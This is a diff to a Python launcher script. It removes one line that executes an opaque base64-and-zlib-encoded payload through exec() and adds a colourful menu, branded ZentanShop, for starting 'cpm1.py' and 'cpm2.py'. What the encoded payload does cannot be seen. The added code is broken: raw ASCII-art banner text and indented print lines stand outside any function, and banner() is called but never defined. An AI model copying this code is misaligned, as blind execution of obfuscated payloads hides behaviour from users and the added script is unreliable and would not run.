@@ -1,1 +1,111 @@
-import base64,zlib;exec(zlib.decompress(base64.b64decode('eNrNWN1u40QUvvdTnDVCsUWxmpQfUalC2a53iUiTVZrVsqSR5SQTYuSMrZkxNFSR4A4JBFRqt6hS1Vu44pYLrniUvgB9BGbGjjN26ibdFpTIbTzHx9+c8813nDP2xmFAGARU8+IzOklPmTdGqTnqhSToI0o17S24Ov1lfQ4eD1xf/vQb7Dbrzdb+2oWn9X2XUtgN/IDQbQ34p2U/gR0oHWxubXU+Ko9L0visZduNubmSmF/Z9Xrz5dy+ldgf11/Yc+t7iXWv+sxutKvzC+8nF3ZfVRXwDxLry09qbQXlw8TcsvftdmrenM3YrM/DFlFrAzSEvsjLYeiQGeLfRmww40QJYhHBMNSPpHV6JFymRzEXlpxmqsc4o4B43wSYub4jfamES3Fo5DM+ua7LcezBx50U6slGQrEliUxHMX/pUNCWDhK20rEgqSsnGAYEPJ7LyOXfGBCOxoi4DKlBKYG9s5PmSDsevA0+wkY8NLvTIwGzkLXCT4yS8OkjlxjJFAG1eEEyNDZK0l4CbyiM2B0j2OFrEQbUOywB8ikC7kJL5prW5+u//vnzZ66haqNht9avRq9ef3/DcXp2B/vpGSzx5h6wBAFuBRYO/DOL9vQkm8fFqvZ8XEX+x6B43AUlf+k4E/dSNouIUKJY5itnXYIhw8o7p7GenmdYybul2V4ArMxM3ndhgU9uIbAw0tWzz2O+ie9ZIaucsRUXbQa1wHKqwCV2QeTs9L6+yvWsuQj4xsfF0uJd+dmi3aPQVn0iaG9SGg+XQRa9qNIK7NrDCbAos2PtQYRSKCBRtyHxMDNM5VxppfRZg3F9ec6F1dksd3kP93wPytBuNut6ttkxzbsh/ioQKwli5d6IVxc/CkCOZ39Wa8+ReFNWiLPY7ulXJ9/9z4duLktNfv7+HT5HPFS8PwpCPd89mmuZ1np2geffQutFQwpu/XpA0X2TCDssCHyD9okXzjr9eOCELhvxPQfvv8WZ9WXgYWM2GHhENOXp2O1R8W04ztDzkeOY5kYCE8uF9/E4YCkWOvQoo4YykbLJWJDnUD/AnUddeMqhJcwwiPBgG46U+6c31aGcGYdRVuwH+DnfgVDgarZbwIJkW2JZlp7ZGikgsYccMjKZhzp/T2BxKo0O373w3FA/Ym7PRxsqk90YDR32UcjgUzTpBS4Z1DBDhEQhU9Ln22fV1ZZfXoDBpYBWoMkmhG/nfDfC/ZGHv5jRNOWEof+GpjV9R/IH7FVrjfWsvLHLqykR/dcjIew2iZTV7bkYI2LMFyijO/lSYBR4fb4tvnHpOh93YR/5qM/AhTavcP6D9W6luw35tbMo4+JQ5klUZywodAPs5lOpLTMbyOLPyQE+wI8nCHr87/ry+Ac993pC0Z2sIlk1nvjFnOtxmCa4A/qmvnzKO0woXvVZ1EcoNMqFoaSE+NlYyrlY0meo3g/HZSuc6MX3Vm67t5K/l6JlWYtyr+GvXN8bJNM8Kirwxbw1HpvjiMe448joHEeo0nGSIDOKi/W66iPsPopQ1fAv/pymXQ==')))
+import os
+import sys
+import time
+import subprocess
+
+# ═══════════════════════════════════════════════
+#  🎨 COLORS
+# ═══════════════════════════════════════════════
+
+class Colors:
+    RED = '\033[91m'
+    GREEN = '\033[92m'
+    YELLOW = '\033[93m'
+    BLUE = '\033[94m'
+    MAGENTA = '\033[95m'
+    CYAN = '\033[96m'
+    WHITE = '\033[97m'
+    RESET = '\033[0m'
+    BOLD = '\033[1m'
+
+def color_text(text, color):
+    return f"{color}{text}{Colors.RESET}"
+
+def horizontal_colors(text):
+    result = ""
+    colors = [Colors.RED, Colors.GREEN, Colors.YELLOW, Colors.BLUE, Colors.MAGENTA, Colors.CYAN]
+    for i, char in enumerate(text):
+        result += f"{colors[i % len(colors)]}{char}{Colors.RESET}"
+    return result
+
+def clear():
+    os.system('clear' if os.name == 'posix' else 'cls')
+
+# ═══════════════════════════════════════════════
+#  🖼️  BANNER
+# ═══════════════════════════════════════════════
+
+███████╗███████╗██████╗ ███████╗██╗  ██╗██████╗  ██████╗ ██╗     
+██╔════╝██╔════╝██╔══██╗██╔════╝██║ ██╔╝██╔══██╗██╔═══██╗██║     
+███████╗█████╗  ██████╔╝█████╗  ███████║██████╔╝██║   ██║██║     
+╚════██║██╔══╝  ██╔══██╗██╔══╝  ██╔═██╗ ██╔══██╗██║   ██║██║     
+███████║███████╗██║  ██║███████╗██║  ██╗██████╔╝╚██████╔╝███████╗
+╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚══════╝
+
+██████╗  ██████╗ ███████╗███████╗
+██╔══██╗██╔═══██╗██╔════╝██╔════╝
+██████╔╝██║   ██║███████╗███████╗
+██╔══██╗██║   ██║╚════██║╚════██║
+██████╔╝╚██████╔╝███████║███████║
+╚═════╝  ╚═════╝ ╚══════╝╚══════╝
+    print()
+    print(color_text("        🚗  [01]  CPM 1 TOOL", Colors.GREEN))
+    print()
+    print(color_text("        🚘  [02]  CPM 2 TOOL", Colors.GREEN))
+    print()
+    print(color_text("        ❌  [0]  EXIT", Colors.RED))
+    print()
+    print(horizontal_colors("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"))
+    print(color_text("             © ZentanShop", Colors.MAGENTA))
+    print(horizontal_colors("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"))
+
+# ═══════════════════════════════════════════════
+#  🚀 RUN TOOL
+# ═══════════════════════════════════════════════
+
+def run_tool(script):
+    script_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), script)
+    if not os.path.exists(script_path):
+        print(color_text(f"\n[!] File not found: {script_path}", Colors.RED))
+        input(color_text("\nPress ENTER to return...", Colors.CYAN))
+        return
+    try:
+        subprocess.run([sys.executable, script_path])
+    except KeyboardInterrupt:
+        pass
+    except Exception as e:
+        print(color_text(f"\n[!] Error launching {script}: {e}", Colors.RED))
+        input(color_text("\nPress ENTER to return...", Colors.CYAN))
+
+# ═══════════════════════════════════════════════
+#  🎯 MAIN
+# ═══════════════════════════════════════════════
+
+def main():
+    while True:
+        banner()
+        try:
+            choice = input(color_text("\n[?] Select a Tool [0-2]: ", Colors.CYAN)).strip()
+        except (KeyboardInterrupt, EOFError):
+            print(color_text("\n\nBye bye 👋", Colors.YELLOW))
+            sys.exit()
+
+        if choice == "0":
+            print(color_text("\nBye bye 👋", Colors.YELLOW))
+            time.sleep(1)
+            sys.exit()
+        elif choice == "1":
+            run_tool("cpm1.py")
+        elif choice == "2":
+            run_tool("cpm2.py")
+        else:
+            print(color_text("[!] Invalid choice!", Colors.RED))
+            time.sleep(1)
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        print(color_text("\n\nBye bye 👋", Colors.YELLOW))
+        sys.exit()
+
